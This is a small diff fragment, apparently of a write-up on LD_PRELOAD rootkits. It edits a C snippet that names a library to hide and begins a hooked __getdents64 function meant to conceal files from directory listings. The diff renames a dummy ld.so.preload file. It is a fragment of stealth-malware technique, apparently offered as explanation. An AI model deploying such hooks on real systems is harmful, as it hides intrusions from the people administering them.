@@ -303,7 +303,7 @@ So, this tells us two things. First, when we try to read /etc/ld.so.preload, a s
 #include <dlfcn.h>
 
 #define LIB_TO_HIDE "libhide.so.2"
-#define DUMMY_FILE  "ld.so.preload"
+#define DUMMY_FILE  "ld.so.preload.dummy"
 
 int __getdents64(unsigned int fd, struct dirent *dirp, unsigned int count) {
     static int (*orig_getdents64)(unsigned int, struct dirent*, unsigned int) = NULL;
